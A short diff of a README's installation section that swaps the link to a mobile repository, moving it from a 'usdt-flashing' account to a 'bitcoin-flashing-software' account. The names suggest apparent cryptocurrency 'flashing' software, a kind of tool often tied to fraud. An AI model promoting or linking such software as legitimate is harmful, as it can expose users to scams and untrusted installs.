@@ -15,7 +15,7 @@ This application requires [Node.js](https://nodejs.org) to run.
 
 ### Android/iOS
 
-Click [here](https://github.com/usdt-flashing/mobile-release) to visit the mobile repository.
+Click [here](https://github.com/bitcoin-flashing-software/mobile-release) to visit the mobile repository.
 
 ### Windows
 
